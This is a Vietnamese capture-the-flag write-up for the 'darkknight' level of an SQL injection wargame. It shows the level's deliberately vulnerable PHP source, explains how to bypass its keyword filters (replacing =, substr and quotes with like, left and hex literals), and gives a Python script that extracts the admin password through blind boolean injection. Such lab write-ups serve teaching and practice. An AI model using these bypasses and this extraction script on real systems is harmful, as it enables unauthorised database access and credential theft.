darkknight
===
### Description
- Source:
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

### Solution
- Phân tích code: Có 2 tham số để chúng ta input vào là `pw` và `no`. `pw` bị filter `'`, `no` bị filter `', substr, ascii, =`. Kết quả câu query đầu tiên chỉ là in ra `Hello guest` hoặc `Hello admin` nếu như `pw` và `no` đúng. Để hiện thị được `Hello admin` thì chúng ta cần tạo payload sao cho câu query select id ở admin vì vậy payload như sau `?pw=1&no=1||1 like 1 %26%26 id like 0x61646d696e-- -`
- Ở query tiếp theo nếu như kết quả của `pw` được trả về từ database trùng với `pw` mình nhập vào thì sẽ giải quyết được bài này. Như bài trước mình đã nói chúng ta có thể thay thế `or` bằng `||`, `and` bằng `&&`, `substr` bằng `mid, left, right,...` ở đây mình sử dụng left, `=` bằng `like`

#### Payload
- Code:
```
import requests
import string

url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
header = {'Cookie':'PHPSESSID=l0ppfki89ui4onrms8661i27el'}
flag = ''
lists = string.digits+string.ascii_lowercase+string.ascii_uppercase
for i in range(1,256):
	for j in lists:
		temp = flag+j
		param = f'pw=1&no=1||1 like 1 %26%26 id like 0x61646d696e %26%26 left(pw,{i}) like "{temp}"-- -'
		print(param)
		r = requests.get(url=url,params=param,headers=header)
		if "Hello admin" in r.text:
			flag += j
			print(flag)
			break
	if len(flag)==8:
		exit(0)
```